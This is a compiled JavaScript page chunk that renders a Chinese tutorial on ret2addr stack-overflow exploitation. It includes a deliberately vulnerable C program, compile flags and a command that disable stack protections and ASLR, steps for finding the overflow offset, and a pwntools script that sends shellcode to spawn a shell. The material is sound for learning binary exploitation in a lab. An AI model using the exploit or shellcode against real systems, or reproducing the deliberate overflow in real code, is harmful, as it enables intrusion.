(window.webpackJsonp=window.webpackJsonp||[]).push([[29],{398:function(t,s,a){"use strict";a.r(s);var n=a(9),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("p",[t._v("最简单的 pwn 就是使用栈溢出返回到一个地址去执行shellcode，虽然见不到这种攻击方法，但是，对栈结构的理解还是很有帮助的。")]),t._v(" "),a("p",[t._v("ret2addr（return-to-address，"),a("strong",[t._v("返回到确定地址执行")]),t._v("的攻击方法）")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX disabled\nPIE:      No PIE (0x8048000)\n")])])]),a("p",[t._v("没有栈不可执行（NX），也没有地址随机化（ASLR）。这时候就直接使用地址覆盖就好。")]),t._v(" "),a("h2",{attrs:{id:"_0-准备一下"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0-准备一下","aria-hidden":"true"}},[t._v("#")]),t._v(" 0. 准备一下")]),t._v(" "),a("p",[t._v("首先要创建一个文件，"),a("code",[t._v("vuln.c")])]),t._v(" "),a("div",{staticClass:"language-c extra-class"},[a("pre",{pre:!0,attrs:{class:"language-c"}},[a("code",[a("span",{pre:!0,attrs:{class:"token macro property"}},[t._v("# "),a("span",{pre:!0,attrs:{class:"token directive keyword"}},[t._v("include")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("<stdio.h>")])]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("void")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("func")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" buf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x50")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("read")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" buf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x100")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("write")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" buf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x100")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("func")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),a("p",[t._v("安装 32 位编译环境")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[t._v("apt-get")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("install")]),t._v(" gcc-multilib g++-multilib\n")])])]),a("p",[t._v("编译并关闭地址随机化")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 编译命令 ")]),t._v("\ngcc -m32 vuln.c -o vuln -fno-stack-protector -z execstack  -no-pie\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 关闭地址随机化功能")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("echo")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /proc/sys/kernel/randomize_va_space\n")])])]),a("h2",{attrs:{id:"_1-确定溢出位置"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-确定溢出位置","aria-hidden":"true"}},[t._v("#")]),t._v(" 1. 确定溢出位置")]),t._v(" "),a("ul",[a("li",[t._v("先在IDA里估计下缓存区大小，然后使用 "),a("code",[t._v("pattern create length")]),t._v("生成一段随机不重复的字符串。")]),t._v(" "),a("li",[t._v("然后在 gdb 中 r指令 运行程序，，由于栈溢出，导致原本的函数的返回地址无法执行。")]),t._v(" "),a("li",[t._v("使用 pattern offset addr 确定程序的返回地址，也就是应该输入的无效字符串的长度。")])]),t._v(" "),a("h2",{attrs:{id:"_2-确定返回地址"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-确定返回地址","aria-hidden":"true"}},[t._v("#")]),t._v(" 2. 确定返回地址")]),t._v(" "),a("ul",[a("li",[a("p",[t._v("打开 core 转储功能")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("ulimit")]),t._v(" -c unlimited\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sudo")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sh")]),t._v(" -c "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'echo \"/tmp/core.%t\" > /proc/sys/kernel/core_pattern'")]),t._v("\n")])])])]),t._v(" "),a("li",[a("p",[t._v("运行程序，输入 上面获得的长度的无效字符串 + 4个任意字符（ESP）+ 4个任意字符（EIP）。此时程序会报错，然后把信息转储至 core 文件。")])]),t._v(" "),a("li",[a("p",[t._v("用 "),a("code",[t._v("gdb 程序名称 core")]),t._v("打开 core 文件。")])]),t._v(" "),a("li",[a("p",[t._v("此时ESP指向了所希望的 shellcode 的位置，也就是我们的自定义代码的位置。")]),t._v(" "),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[t._v("gdb-peda$ print "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$esp")]),t._v("\n0xffffcf80\n")])])])]),t._v(" "),a("li",[a("p",[t._v("此时EIP应该填充为 shellcode 的地址，即此时ESP的值。")])])]),t._v(" "),a("h2",{attrs:{id:"_3-编写利用脚本"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-编写利用脚本","aria-hidden":"true"}},[t._v("#")]),t._v(" 3. 编写利用脚本")]),t._v(" "),a("p",[t._v("shellcode 可以在 "),a("a",{attrs:{href:"http://shell-storm.org/shellcode/",target:"_blank",rel:"noopener noreferrer"}},[t._v("shell-strom"),a("OutboundLink")],1),t._v(" 这里找到很多，也可以自己手写。")]),t._v(" "),a("div",{staticClass:"language-python extra-class"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" pwn "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#context.log_level='debug'")]),t._v("\np"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("process"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"./vuln"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 此处是程序的路径")]),t._v("\npayload"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'a'")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("92")]),t._v("\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 此处的92是第一步所确定的无效字符串的长度")]),t._v("\npayload"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),t._v("p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0xffffcf80")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#此处的地址是第二步时获得的 shellcode 地址")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#shellcode脚本")]),t._v("\npayload"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x32\\x80"')]),t._v("\npayload"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\x6c\\x0e\\xff\\x01\\x80\\xe9\\x01\\x75"')]),t._v("\npayload"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff"')]),t._v("\npayload"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\x32\\xc1\\x51\\x69\\x30\\x30\\x74\\x69"')]),t._v("\npayload"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\x69\\x30\\x63\\x6a\\x6f\\x8a\\xe4\\x51"')]),t._v("\npayload"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\x54\\x8a\\xe2\\x9a\\xb1\\x0c\\xce\\x81"')]),t._v("\n\np"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("send"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("payload"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\np"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("interactive"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#返回交互式界面")]),t._v("\n")])])]),a("h2",{attrs:{id:"_4-pwn"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_4-pwn","aria-hidden":"true"}},[t._v("#")]),t._v(" 4. pwn")]),t._v(" "),a("ul",[a("li",[t._v("执行"),a("code",[t._v("python vuln.py")]),t._v("（即第三步的脚本文件）")])])])}),[],!1,null,null,null);s.default=e.exports}}]);